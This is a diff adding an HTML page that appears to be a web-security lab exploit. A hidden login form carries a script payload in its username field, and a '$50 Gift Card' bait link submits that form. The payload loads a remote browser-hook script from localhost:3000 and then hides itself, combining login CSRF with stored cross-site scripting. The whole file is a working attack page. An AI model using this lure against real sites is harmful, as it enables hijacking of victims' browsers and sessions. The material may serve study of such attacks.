@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="ISO-8859-1">
+<title>Insert title here</title>
+</head>
+<body>
+	<form name="login" method="post" action="/login">
+		<input type="hidden" name="username" value='<script id="evil">var js = document.createElement("SCRIPT"); js.src = "http://localhost:3000/hook.js"; document.head.appendChild(js); document.getElementById("evil").parentElement.style.display="none";</script>'/>
+		<input type="hidden" name="password" value=""/>
+		<a href="#" onclick="login.submit()">$50 Gift Card for Joining Today!</a>
+	</form>
+</body>
+</html>
